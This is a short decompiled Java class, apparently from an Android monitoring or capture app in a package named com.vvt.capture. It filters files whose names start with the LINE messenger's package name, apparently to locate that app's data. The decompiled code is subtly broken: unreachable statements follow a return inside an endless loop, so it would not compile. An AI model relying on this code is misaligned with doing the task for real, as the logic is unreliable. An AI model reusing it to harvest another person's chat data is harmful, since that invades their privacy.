package com.vvt.capture.c;

import java.io.File;
import java.io.FilenameFilter;

class j
  implements FilenameFilter
{
  j(i parami) {}
  
  public boolean accept(File paramFile, String paramString)
  {
    String str = "jp.naver.line.android";
    boolean bool = paramString.startsWith(str);
    if (bool) {
      bool = true;
    }
    for (;;)
    {
      return bool;
      bool = false;
      str = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/j.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */